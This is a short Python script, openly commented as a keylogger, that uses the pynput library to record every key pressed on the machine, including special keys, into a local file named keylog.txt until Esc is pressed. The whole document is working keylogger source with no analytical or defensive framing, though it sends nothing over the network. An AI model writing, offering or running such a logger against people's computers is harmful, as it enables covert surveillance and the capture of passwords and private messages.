
from pynput.keyboard import Key, Listener

# Specify the file where keystrokes will be logged
log_file = "keylog.txt"

# Function to log keys
def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Log key presses with readable formatting
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Stop the keylogger gracefully when needed
def on_release(key):
    if key == Key.esc:  # Stop keylogger when 'Esc' is pressed
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
